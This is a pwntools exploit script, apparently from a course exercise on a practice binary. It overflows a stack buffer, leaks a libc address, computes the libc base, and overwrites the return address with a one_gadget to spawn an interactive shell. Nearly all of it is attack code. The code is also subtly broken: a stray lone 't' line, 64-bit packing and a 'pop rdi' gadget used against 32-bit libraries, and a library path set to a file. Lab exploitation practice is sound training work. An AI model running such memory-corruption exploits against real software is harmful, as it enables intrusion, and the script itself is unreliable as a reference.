#!/usr/bin/env python3
from pwn import *

EXE_FILENAME = '../pwn_student_binaries/call_me_Federico-Conti'
LIBC_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/libc.so.6'
LD_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/ld-linux.so.2'

"""
$ gdb --args ./remote-libc/32-bits/ld-linux.so.2 --library-path ./remote-libc/32-bits ./call_me_Federico-Conti
gef➤ set stop-on-solib-events 1
gef➤ run
Stopped due to shared library event
gef➤ b *0xf7fc028a
Breakpoint 1 at 0xf7fc028a
gef➤ continue

0xf7fc0000  + 0x10c0 ENTRU
0xf7fc10c0
"""
exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 192
LIBC_LEAK = EIP_OFFSET + 8
POP_RDI = 0x000000000010f78b # ropper --file ./libc.so.6  --search 'pop rdi'
RET = POP_RDI+1
ONE_GADGET = 0xef4ce #one_gadget libc.so.6 

def start():
	gdbscript = '''

	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process([LD_FILENAME, EXE_FILENAME],
               env={"LD_LIBRARY_PATH": LIBC_FILENAME})


io = start()


lyrics = [
    b"Color me your color, baby",
    b"Color me your car",
    b"Color me your color, darling",
]

io.sendlineafter(b'# ', (b'a'*(LIBC_LEAK-1)) ) # sendline() aggiunge automaticamente un byte finale \n
io.recvuntil(b'aaaa\n')
l = io.clean()
i = l.find(b'Enter')

log.info(f"Received data: {l}")
t
assert i > 0
leak = l[:i].ljust(4, b'\x00') #

log.info(f"Leak: {leak}") # indirizzo di una funzione all’interno della libc.

libc_base = u64(leak) - 0x15c1 # la return address sullo stack è un'istruzione interna di __libc_start_main,
								# Biogna vedere a che punto della __libc_start_main  il main torna dopo aver temrminato
								# objdump -T libc-2.27.so | grep __libc_start_main

log.info(f"Libc base address: {hex(libc_base)}")


io.sendline(
    			 b'a'*EIP_OFFSET 
                 + p64(libc_base +RET) #to align the stack 
                 + p64(libc_base + ONE_GADGET) 
            )
io.sendlineafter(b'# ', b'HZD')
io.interactive()